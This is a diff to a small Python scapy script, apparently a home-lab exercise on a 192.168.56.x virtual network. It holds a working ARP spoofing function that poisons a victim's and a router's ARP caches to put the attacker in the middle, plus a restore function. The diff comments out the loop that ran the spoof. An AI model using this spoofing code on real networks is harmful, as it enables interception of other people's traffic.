@@ -58,6 +58,7 @@ def get_interfaces():
 
     return interfaces
 
+
 def arpSpoof(victimIP, victimMAC, routerIP, routerMAC):
     # Gets the mac address of the attacker
     interface = scapy.all.get_working_if()
@@ -67,11 +68,12 @@ def arpSpoof(victimIP, victimMAC, routerIP, routerMAC):
     scapy.all.send(scapy.all.ARP(op=2, pdst = victimIP, psrc = routerIP, hwdst=victimMAC, hwsrc=attackerMAC))
     scapy.all.send(scapy.all.ARP(op=2, pdst = routerIP, psrc = victimIP, hwdst=routerMAC, hwsrc=attackerMAC))
 
+
 def arpRestore(victimIP, victimMAC, routerIP, routerMAC):
     scapy.all.send(scapy.all.ARP(op = 2, pdst = routerIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc= victimMAC), count = 4)
     scapy.all.send(scapy.all.ARP(op = 2, pdst = victimIP, psrc = routerIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = routerMAC), count = 4)
 
-while 1:
-    arpSpoof('192.168.56.101', '08:00:27:B0:A1:AB', '192.168.56.1', '0a:00:27:00:00:13')
+# while 1:
+#     arpSpoof('192.168.56.101', '08:00:27:B0:A1:AB', '192.168.56.1', '0a:00:27:00:00:13')
 # arpRestore('192.168.56.101', '08:00:27:B0:A1:AB', '192.168.56.1', '0a:00:27:00:00:13')
 # scan("192.168.56.0/24", "enp0s3")
